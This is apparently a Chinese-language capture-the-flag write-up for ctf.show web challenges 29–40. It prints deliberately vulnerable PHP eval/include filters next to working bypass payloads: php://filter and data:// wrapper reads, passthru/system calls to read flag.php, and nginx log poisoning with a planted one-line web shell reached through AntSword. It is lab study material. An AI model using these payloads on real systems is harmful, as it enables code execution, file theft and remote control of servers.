# Web 29
![[Pasted image 20240821155539.png]]
能执行`$_GET['c']`中的语句，但是这个语句中不能存在`flag`这个单词。
我们先看看有啥：
![[Pasted image 20240821155629.png]]
最终还是要让我们输出`flag.php`：
![[Pasted image 20240821160130.png]]
# Web 30
![[Pasted image 20240821161009.png]]
![[Pasted image 20240821161455.png]]
# Web 31
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 00:49:10  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```


用`/?c=passthru("tac%09fl*")`中的`%09`也就是`TAB`键代替空格`%20`
![[Pasted image 20240822091817.png]]
或者
`?c=show_source(scandir(getcwd())[2]);`
![[Pasted image 20240822092155.png]]
# Web 32
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 00:56:31  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```

访问网站的时候用这个payload.
```
c=$nice=include$_GET[url]?>&url=php://filter/read=convert.base64-
encode/resource=flag.php
```
- `include` 是 PHP 的一个函数，它会将指定文件的内容嵌入到当前脚本中执行。
- #### **恶意 `url` 参数**
```php
url=php://filter/read=convert.base64-encode/resource=flag.php
```
这部分代码的含义如下：
- `php://filter/`：PHP 提供的一种特殊的流，可以在访问文件时应用各种过滤器（filters）。`php://filter` 允许你对文件的内容进行操作（如编码、解码等）。
- `read=convert.base64-encode/`: 这是一种过滤器链，它会读取文件内容，并在读取时将内容转换为 Base64 编码。
- `resource=flag.php`：这是被读取和编码的实际文件，表示目标是服务器上的 `flag.php` 文件。
# Web 33
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 02:22:27  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
*/  
//  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```
用下面这个恶意代码，就可以了。
```Bash
https://86396f60-51bc-4fed-9613-4845a4e2675f.challenge.ctf.show/?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```
![[Pasted image 20240824194452.png]]
![[Pasted image 20240824194518.png]]
# Web 34
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 04:21:29  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
*/  
  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```

同样的招没啥变化
![[Pasted image 20240824195533.png]]
![[Pasted image 20240824195628.png]]
# Web 35
![[Pasted image 20240824201251.png]]
这次我用用nginx日志文件
URL:
```
https://794ac7d7-087e-4e53-be4d-8497df5b083a.challenge.ctf.show/?c=include$_GET[a]?%3E&a=/var/log/nginx/access.log
```
HackBar上在User-Agent上插入一句话木马，让密码为`a`。
![[Pasted image 20240824202246.png]]
中国蚁剑连上背后的靶机：
![[Pasted image 20240824202436.png]]
已经看到了！
![[Pasted image 20240824202537.png]]
# Web 36
已经没啥挑战了，千篇一律：
![[Pasted image 20240824202937.png]]
# Web 37
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 05:18:55  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
*/  
  
//flag in flag.php  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag/i", $c)){  
        include($c);  
        echo $flag;  
      
    }  
          
}else{    highlight_file(__FILE__);  
}
```
这个命令太牛逼了，换成include不能用之前的东西了，这个还是可以：
```Bash
{URL}/?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
```
![[Pasted image 20240824204216.png]]
# Web 38
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 05:23:36  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
*/  
  
//flag in flag.php  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|php|file/i", $c)){  
        include($c);  
        echo $flag;  
      
    }  
          
}else{    highlight_file(__FILE__);  
}
```
方法也是
```Bash
{URL}/?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
```
# Web 39
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 06:13:21  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
*/  
  
//flag in flag.php  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag/i", $c)){  
        include($c.".php");  
    }  
          
}else{    highlight_file(__FILE__);  
}
```
不用管`include()`里面的那个`.php`，只要我们闭合了`$c`中的PHP代码，那后面的也不会有用。
所以我们使用：
```bash
https://d3b86d58-9281-4fe3-a43b-548e57f31ecc.challenge.ctf.show/?c=data://text/palin,%3C?php%20system(%22tac%20fl*.php%22);%20?%3E
```
就可以了。
# Web 40
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 06:03:36  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
*/  
  
  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){  
        eval($c);  
    }  
          
}else{    highlight_file(__FILE__);  
}
```

先看文件目录：
```
{URL}/?c=var_dump(scandir(pos(localeconv())));
```
![[Pasted image 20240824213038.png]]
- 通常，`localeconv()` 返回的第一个元素可能是 `decimal_point` 键，其值为小数点符号（例如，`"."`）。
- `scandir(pos(localeconv()))` 可能相当于 `scandir(".")`，即列出当前目录的内容。
- **`var_dump()`** 输出 `scandir()` 的返回结果。
然后再`show_source()`
```
{URL}/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
```
![[Pasted image 20240824212907.png]]